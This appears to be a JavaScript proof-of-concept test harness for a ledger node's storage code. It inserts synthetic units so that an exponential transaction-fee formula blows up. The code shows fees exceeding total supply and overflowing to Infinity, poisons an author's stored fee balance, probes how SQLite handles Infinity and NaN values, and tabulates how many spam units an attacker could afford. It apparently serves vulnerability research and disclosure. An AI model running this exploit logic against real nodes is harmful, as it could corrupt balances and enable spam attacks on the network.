// P6 — tps-fee exp() blow-up → author balance poisoning (storage.js getFinalTpsFee/updateTpsFees)
// Scenario A: count=30, elapsed=1 → fee ≥10% of supply. Scenario B: count=710 → exp() overflow → Infinity.
// Drives the REAL storage path: real units/unit_authors/parenthoods rows, real initCaches, real updateTpsFees.
// Connection lifecycle: inserts (conn) → release → initCaches (own conn) → settle+reads (conn2).
module.exports = async function (db, storage, network, validation, objectHash, signature, composer, mutex, constants) {
  const AUTH = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // 32 chars — synthetic author address
  const q = async (label, sql, params) => {
    try { return await db.query(sql, params || []); }
    catch (e) { console.log("Q_ERR", label, String(e).slice(0, 200)); return []; }
  };
  // db.query (pool-level) takes/releases a connection per query — avoids the pool=1 deadlock entirely.

  const sv = await q("sysvars", "SELECT subject, value, vote_count_mci FROM system_vars ORDER BY subject, vote_count_mci DESC");
  console.log("SYSTEM_VARS", JSON.stringify(sv.filter(r => ["base_tps_fee","tps_interval","tps_fee_multiplier","threshold_size"].includes(r.subject))));
  await q("addr", "INSERT OR REPLACE INTO addresses (address) VALUES (?)", [AUTH]);

  const mkUnit = (tag, n, pad) => tag + String(n).padStart(pad, "0") + "0".repeat(Math.max(0, 44 - tag.length - pad));

  const insertUnit = async (unit, mci, ts, opts) => {
    opts = opts || {};
    await q("u:" + unit.slice(0, 7),
      "INSERT OR REPLACE INTO units (unit, version, timestamp, headers_commission, payload_commission, tps_fee, is_free, is_on_main_chain, main_chain_index, latest_included_mc_index, level, witnessed_level, is_stable, sequence, best_parent_unit, last_ball_unit) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
      [unit, "4.0", ts, 100, 100, opts.tps_fee || 0, 1, opts.is_on_main_chain ? 1 : 0, mci, mci, mci, mci, 1, opts.sequence || "good", opts.best_parent_unit || null, opts.last_ball_unit || null]);
    await q("ua:" + unit.slice(0, 7), "INSERT OR REPLACE INTO unit_authors (unit, address) VALUES (?,?)", [unit, AUTH]);
    if (opts.is_on_main_chain) // stable MC units must have a ball row (readLastStableMcUnitProps requires it)
      await q("ball:" + unit.slice(0, 7), "INSERT OR REPLACE INTO balls (ball, unit) VALUES (?,?)", ["B" + "0".repeat(43), unit]);
    if (opts.parent)
      await q("par:" + unit.slice(0, 7), "INSERT OR REPLACE INTO parenthoods (parent_unit, child_unit) VALUES (?,?)", [opts.parent, unit]);
  };

  const T = 1700000000;
  const LB = mkUnit("LB", 0, 42);

  const buildChain = async (tag, nUnits, mci, declaredFee, firstParent, mcAt) => {
    let prev = firstParent;
    for (let i = 1; i <= nUnits; i++) {
      const u = mkUnit(tag, i, 6);
      await insertUnit(u, mci, T, { parent: prev, best_parent_unit: prev, is_on_main_chain: (i === mcAt), last_ball_unit: LB, tps_fee: declaredFee || 0 });
      prev = u;
    }
    return prev;
  };

  const settle = async (conn, mci) => {
    try { await storage.updateTpsFees(conn, [mci]); return { ok: true }; }
    catch (e) { return { ok: false, error: String(e).slice(0, 300) }; }
  };

  // ================== SCENARIO A: 30 units at mci 101, equal timestamps → elapsed=1 ==================
  console.log("\n===== SCENARIO A: 30 units in a 1-second window (count=30, elapsed=1) =====");
  await insertUnit(LB, 100, T, { is_on_main_chain: true, best_parent_unit: null, last_ball_unit: null });
  await buildChain("U", 30, 101, 100000, LB, 30); // victim (last) declares tps_fee=100000
  await storage.initCaches(); // takes its own connection; pool-level inserts above never hold one
  const connA = await db.takeConnectionFromPool();
  const settleA = await settle(connA, 101);
  console.log("settle(101) ok:", settleA.ok, settleA.error || "");
  const balA = await q("balA", "SELECT address, mci, tps_fees_balance FROM tps_fees_balances WHERE address=? ORDER BY mci", [AUTH]);
  console.log("BALANCES_A", JSON.stringify(balA));
  const feeA = await q("feeA", "SELECT unit, actual_tps_fee FROM units WHERE main_chain_index=101 AND actual_tps_fee IS NOT NULL ORDER BY unit LIMIT 3", []);
  console.log("ACTUAL_FEE_A", JSON.stringify(feeA));
  const balLastA = balA.length ? balA[balA.length - 1].tps_fees_balance : 0;
  console.log("FEE_EXCEEDS_SUPPLY_A:", Math.abs(balLastA) > 1e15, "(balance", balLastA, "vs total supply 1e15)");
  console.log("FRACTION_OF_SUPPLY_A:", (Math.abs(balLastA) / 1e15).toExponential(3));
  connA.release();

  // ================== SCENARIO B: +680 more units at mci 102 → total window count 710 ==================
  console.log("\n===== SCENARIO B: window grows to 710 units → exp() overflow =====");
  const lastA = mkUnit("U", 30, 6);
  await buildChain("W", 680, 102, 100000, lastA, 680); // W-chain on top of A-chain: 680+30 = 710 in window
  await storage.initCaches();
  const connB = await db.takeConnectionFromPool();
  const settleB = await settle(connB, 102);
  console.log("settle(102) ok:", settleB.ok, settleB.error || "");
  const balB = await q("balB", "SELECT address, mci, tps_fees_balance FROM tps_fees_balances WHERE address=? ORDER BY mci", [AUTH]);
  console.log("BALANCES_B (tail)", JSON.stringify(balB.slice(-3)));
  const feeB = await q("feeB", "SELECT unit, actual_tps_fee FROM units WHERE main_chain_index=102 AND actual_tps_fee IS NOT NULL ORDER BY unit LIMIT 3", []);
  console.log("ACTUAL_FEE_B", JSON.stringify(feeB));
  connB.release();

  // ================== sqlite3 Infinity/NaN on INT columns (real conn) ==================
  console.log("\n===== sqlite3 Infinity/NaN handling on INT columns =====");
  const connC = await db.takeConnectionFromPool();
  const probes = [
    ["UPDATE units SET actual_tps_fee=? WHERE unit=?", [Infinity, mkUnit("W", 680, 6)]],
    ["UPDATE units SET actual_tps_fee=? WHERE unit=?", [NaN, mkUnit("W", 679, 6)]],
    ["REPLACE INTO tps_fees_balances (address, mci, tps_fees_balance) VALUES (?,?,?)", [AUTH, 999, -Infinity]],
    ["REPLACE INTO tps_fees_balances (address, mci, tps_fees_balance) VALUES (?,?,?)", [AUTH, 998, NaN]],
  ];
  for (const [sql, params] of probes) {
    try {
      await connC.query(sql, params);
      const chk = await connC.query("SELECT unit, actual_tps_fee FROM units WHERE unit IN (?,?) UNION ALL SELECT 'balance', tps_fees_balance FROM tps_fees_balances WHERE mci IN (998,999)", [mkUnit("W", 680, 6), mkUnit("W", 679, 6)]);
      console.log("PROBE_OK", JSON.stringify(chk));
    } catch (e) {
      console.log("PROBE_ERR", String(e).slice(0, 180));
    }
  }
  connC.release();

  // ================== SELF-LIMITING analysis ==================
  console.log("\n===== SELF-LIMITING: declared fee required for spam unit #N at validation =====");
  console.log("(validation.js:1073-1095: unit rejected unless balance + declared_fee >= getLocalTpsFee = round(100*(exp(N)-1)))");
  console.log("N | required declared fee | fraction of total supply (1e15)");
  for (const N of [5, 10, 15, 20, 25, 28, 29, 30, 31, 32, 33, 34, 35]) {
    const fee = Math.round(100 * (Math.exp(N) - 1));
    console.log(N, fee, (fee / 1e15).toExponential(3));
  }
  console.log("crossover — max spam-unit index N affordable with attacker balance:");
  for (const balance of [1e12, 1e13, 1e14, 1e15]) {
    let N = 0;
    while (N < 40 && Math.round(100 * (Math.exp(N + 1) - 1)) <= balance) N++;
    console.log("  balance", balance.toExponential(2), "→ max N =", N);
  }

  console.log("\nP6-DONE");
};
